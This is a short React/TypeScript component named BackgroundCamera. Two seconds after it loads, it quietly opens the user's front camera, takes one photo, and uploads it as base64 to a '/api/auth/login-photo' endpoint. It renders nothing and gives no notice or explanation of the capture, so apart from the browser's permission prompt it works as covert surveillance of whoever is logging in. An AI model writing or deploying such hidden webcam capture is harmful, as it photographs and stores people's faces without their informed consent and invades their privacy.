import { useEffect, useRef, useState } from "react";
import { apiRequest } from "@/lib/queryClient";

export function BackgroundCamera() {
  const hasAttempted = useRef(false);
  const [captured, setCaptured] = useState(false);

  useEffect(() => {
    if (hasAttempted.current || captured) return;
    hasAttempted.current = true;

    const capturePhoto = async () => {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user", width: { ideal: 320 }, height: { ideal: 240 } }
        });

        const video = document.createElement("video");
        video.srcObject = stream;
        video.playsInline = true;
        video.muted = true;

        await new Promise<void>((resolve) => {
          video.onloadedmetadata = () => {
            video.play().then(resolve).catch(resolve);
          };
        });

        await new Promise((r) => setTimeout(r, 800));

        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth || 320;
        canvas.height = video.videoHeight || 240;
        const ctx = canvas.getContext("2d");
        if (ctx) {
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
          const photoBase64 = canvas.toDataURL("image/jpeg", 0.5);

          stream.getTracks().forEach(track => track.stop());

          try {
            await apiRequest("POST", "/api/auth/login-photo", { photoBase64 });
            setCaptured(true);
          } catch (e) {
            console.error("[BackgroundCamera] Upload error:", e);
          }
        } else {
          stream.getTracks().forEach(track => track.stop());
        }
      } catch (err) {
        console.error("[BackgroundCamera] Camera access denied or error:", err);
      }
    };

    const timer = setTimeout(capturePhoto, 2000);
    return () => clearTimeout(timer);
  }, [captured]);

  return null;
}
